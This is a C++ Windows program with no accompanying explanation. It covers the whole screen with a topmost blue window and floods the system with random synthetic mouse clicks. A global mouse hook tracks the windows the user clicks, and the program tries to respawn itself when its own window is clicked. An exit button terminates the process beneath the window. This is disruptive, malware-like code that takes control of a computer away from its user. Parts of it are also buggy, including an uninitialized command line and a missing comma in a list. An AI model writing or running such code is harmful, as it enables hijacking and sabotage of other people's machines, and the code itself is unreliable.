#include <windows.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <random>
#include <vector>
#include <algorithm>
#include <TlHelp32.h>
#include <psapi.h> // For process information
#include <tchar.h>
#include <set>
HHOOK hMouseHook;
HWND hwnd; // Global variable for the window handle
HWND hwndTarget = NULL; // Global variable for the target window handle

std::vector<std::string> excludedProcesses = {
    "explorer.exe",
    "firefox.exe",
    "chrome.exe",
    "steam.exe",
    "devenv.exe"
    "ConsoleApplication3.exe"
    // Add more process names here...
};

std::set<HWND> knownWindows;
std::set<HWND> windowsWithBlueScreen;


std::string GetProcessName(DWORD processId)
{
    std::string processName = "";
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32))
        {
            do
            {
                if (pe32.th32ProcessID == processId)
                {
                    char ch[260];
                    char DefChar = ' ';
                    WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ch, 260, &DefChar, NULL);
                    processName = ch;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processName;
}



BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    auto& knownWindows = *reinterpret_cast<std::set<HWND>*>(lParam);

    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    std::string processName = GetProcessName(processId);

    // If the window is not in the known windows set and is not in the exclusive list
    if (knownWindows.find(hwnd) == knownWindows.end() &&
        std::find(excludedProcesses.begin(), excludedProcesses.end(), processName) == excludedProcesses.end())
    {
        // Add the window to the known windows set
        knownWindows.insert(hwnd);

        // Attach the blue window to the new window
        hwndTarget = hwnd;
        windowsWithBlueScreen.insert(hwnd);
    }

    return TRUE;
}

void CheckForNewWindows()
{
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&knownWindows));
}

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
    {
        break;
    }
    case WM_COMMAND:
    {
        // If the Exit button is clicked, terminate the process below the blue window and exit the blue window (Removed This)
        if (LOWORD(wParam) == 1)
        {
            DWORD processId;
            GetWindowThreadProcessId(hwndTarget, &processId);
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);

            PostMessage(hwnd, WM_CLOSE, 0, 0);
        }
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}


void MoveWindowThread()
{
    while (true)
    {
        if (hwndTarget != NULL)
        {
            // Get the size of the screen
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            RECT rect;
            GetWindowRect(hwndTarget, &rect);

            // Move the blue window to cover the entire screen
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, screenWidth, screenHeight, SWP_SHOWWINDOW);

            // Simulate 50 random clicks on the blue window
            for (int i = 0; i < 50; i++)
            {
                // Generate a random position within the window
                int x = rand() % screenWidth;
                int y = rand() % screenHeight;

                // Convert the client-area coordinates to screen coordinates
                POINT pt = { x, y };
                ClientToScreen(hwnd, &pt);

                // Simulate a mouse click at the random position
                mouse_event(MOUSEEVENTF_LEFTDOWN, pt.x, pt.y, 0, 0);
                mouse_event(MOUSEEVENTF_LEFTUP, pt.x, pt.y, 0, 0);

                // Sleep for a while between clicks
                Sleep(10);
            }
        }

        Sleep(10);  // Sleep for a while to reduce CPU usage
    }
}

int clickCount = 0;

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_LBUTTONDOWN)
    {
        MOUSEHOOKSTRUCT* pMouseStruct = (MOUSEHOOKSTRUCT*)lParam;
        if (pMouseStruct != NULL)
        {
            HWND hwndClicked = WindowFromPoint(pMouseStruct->pt);
            if (hwndClicked != NULL)  // Exclude the blue window
            {
                DWORD processId;
                GetWindowThreadProcessId(hwndClicked, &processId);
                std::string processName = GetProcessName(processId);

                // Get the title of the window
                char title[256];
                GetWindowTextA(hwndClicked, title, sizeof(title));

                // If the window is the blue window, create a new instance of the blue window
                if (std::string(title) == "Blue Window")
                {
                    // Start a new process
                    STARTUPINFO si;
                    PROCESS_INFORMATION pi;

                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);
                    ZeroMemory(&pi, sizeof(pi));

                    // Convert the command line to a wide string
                    wchar_t wideCommandLine[260];
                   // MultiByteToWideChar(CP_ACP, 0, "C:\\Users\\PC\\source\\repos\\ConsoleApplication3\\x64\\Release\\ConsoleApplication3.exe", -1, wideCommandLine, 260);

                    // Start the child process. 
                    if (!CreateProcess(NULL,   // No module name (use command line)
                        wideCommandLine, // Command line
                        NULL,           // Process handle not inheritable
                        NULL,           // Thread handle not inheritable
                        FALSE,          // Set handle inheritance to FALSE
                        0,              // No creation flags
                        NULL,           // Use parent's environment block
                        NULL,           // Use parent's starting directory 
                        &si,            // Pointer to STARTUPINFO structure
                        &pi)           // Pointer to PROCESS_INFORMATION structure
                        )
                    {
                        printf("CreateProcess failed (%d).\n", GetLastError());
                        return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
                    }

                    // Close process and thread handles. 
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                else if (std::find(excludedProcesses.begin(), excludedProcesses.end(), processName) == excludedProcesses.end() &&
                    windowsWithBlueScreen.find(hwndClicked) == windowsWithBlueScreen.end())
                {
                    hwndTarget = hwndClicked;

                    // Add the window to the list of windows with a blue screen
                    windowsWithBlueScreen.insert(hwndClicked);
                }
            }
        }
    }

    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}



int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nCmdShow)
{
    const char CLASS_NAME[] = "Sample Window Class";

    WNDCLASS wc = { };

    wc.lpfnWndProc = WindowProcedure;
    wc.hInstance = hInst;
    wc.lpszClassName = L"CLASS_NAME";
    wc.hbrBackground = CreateSolidBrush(RGB(10, 59, 118)); // Bluish color

    if (!RegisterClass(&wc))
    {
        MessageBox(NULL, L"Window Registration Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    hwnd = CreateWindowEx(WS_EX_LAYERED, L"CLASS_NAME", L"Blue Window", WS_POPUP, CW_USEDEFAULT, CW_USEDEFAULT, 200, 200, NULL, NULL, hInst, NULL);

    if (hwnd == NULL)
    {
        MessageBox(NULL, L"Window Creation Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    // Set the window to be semi-transparent
    SetLayeredWindowAttributes(hwnd, 0, (255 * 70) / 100, LWA_ALPHA);

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInst, 0);

    std::thread t(MoveWindowThread);  // Start the move window thread
    t.detach();

    // Start Windows Defender
    ShellExecute(NULL, L"open", L"ms-settings:windowsdefender", NULL, NULL, SW_MAXIMIZE);

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hMouseHook);

    return 0;
}
